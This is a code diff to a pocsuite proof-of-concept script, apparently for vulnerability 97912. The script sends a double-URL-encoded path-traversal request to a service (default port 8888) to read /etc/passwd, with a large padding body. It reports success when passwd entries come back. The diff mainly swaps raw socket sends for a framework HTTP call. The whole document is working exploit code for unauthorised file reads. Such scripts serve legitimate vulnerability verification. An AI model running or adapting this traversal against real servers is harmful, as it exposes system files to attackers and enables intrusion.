@@ -2,9 +2,11 @@
 # coding: utf-8
 from pocsuite.api.poc import register
 from pocsuite.api.poc import Output, POCBase
+from pocsuite.api.request import req
 import urllib
 import socket
 import time
+from urlparse import urljoin
 
 class TestPOC(POCBase):
     vulID = '97912'  # ssvid
@@ -36,34 +38,10 @@ class TestPOC(POCBase):
         result = {}
         if port is None:
             port = 8888
-        sock = socket.socket()
-        sock.connect((host,int(port)))
-        sock.send('GET /foo/default/master/..%252F..%252F..%252F..%252Fetc%252fpasswd HTTP/1.0\r\n'.encode('ascii'))
-        sock.send('Host: {}\r\n'.format(host).encode('ascii'))
-        sock.send('\r\n'.encode('ascii'))
-        str_five = 'testssdfsf ' * 200
-        sock.send(str_five.encode('ascii'))
-        sock.send(str_five.encode('ascii'))
-        sock.send(str_five.encode('ascii'))
-        sock.send(str_five.encode('ascii'))
-        sock.send(str_five.encode('ascii'))
-        sock.send(str_five.encode('ascii'))
-        sock.send(str_five.encode('ascii'))
-        sock.send(str_five.encode('ascii'))
-        sock.send(str_five.encode('ascii'))
-        sock.send(str_five.encode('ascii'))
-        sock.send(str_five.encode('ascii'))
-        sock.send(str_five.encode('ascii'))
-        sock.send(str_five.encode('ascii'))
-        sock.send(str_five.encode('ascii'))
-        sock.send(str_five.encode('ascii'))
-        sock.send(str_five.encode('ascii'))
-        sock.send(str_five.encode('ascii'))
-        sock.send(str_five.encode('ascii'))
-        chunk = sock.recv(4096)
-        sock.close()
+        http_body = "010202030302"*500000
+        vul_url = urljoin(vul_url,"/foo/default/master/..%252F..%252F..%252F..%252Fetc%252fpasswd")
+        chunk = req.get(vul_url,data=http_body).text
         if  "bin" in chunk and "/usr/sbin" in chunk and "root" in chunk:
-            print(chunk)
             result['VerifyInfo'] = "success"
         pass
         return self.parse_output(result)
